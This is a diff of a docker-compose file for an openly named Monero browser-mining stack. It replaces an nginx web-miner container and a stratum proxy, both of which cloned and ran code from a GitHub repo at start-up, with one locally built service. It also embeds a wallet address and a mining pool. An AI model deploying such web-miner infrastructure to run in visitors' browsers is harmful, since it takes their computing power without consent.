@@ -1,39 +1,14 @@
 services:
-  web:
-    image: nginx:alpine
-    container_name: xmr-web-miner
+  xmr-miner:
+    build:
+      context: .
+      dockerfile: proxy/Dockerfile
+    container_name: xmr-miner
     ports:
-      - "8088:80"
-    command: >
-      sh -c 'apk add --no-cache git &&
-      git clone https://github.com/Dequanjae/XMR-WebMIner.git /tmp/repo &&
-      cp -r /tmp/repo/web/* /usr/share/nginx/html/ &&
-      cp /tmp/repo/nginx/nginx.conf /etc/nginx/conf.d/default.conf &&
-      rm -rf /tmp/repo &&
-      nginx -g "daemon off;"'
-    restart: unless-stopped
-
-  proxy:
-    image: node:18-alpine
-    container_name: xmr-miner-proxy
-    ports:
+      - "8080:8080"
       - "8081:8081"
-      - "8082:8082"
     environment:
       - WALLET=8ApdEka2j6CUaaNKp12H1VBi1bziZB2T9Dhju1fPzgiTC8KBLWEEddVeZnpZjg7Ni4KCENsPLfSDfh2nbMhbFqngM5wKwHE
-      - POOL_HOST=xmrpool.eu
+      - POOL_HOST=pool.supportxmr.com
       - POOL_PORT=3333
-      - POOL_SSL=false
-      - PROXY_PORT=8081
-      - DIFF=5000
-    command: >
-      sh -c 'apk add --no-cache git &&
-      git clone https://github.com/Dequanjae/XMR-WebMIner.git /tmp/repo &&
-      mkdir -p /app &&
-      cp /tmp/repo/proxy/proxy.js /app/ &&
-      rm -rf /tmp/repo &&
-      cd /app &&
-      npm init -y &&
-      npm install ws &&
-      node proxy.js'
     restart: unless-stopped
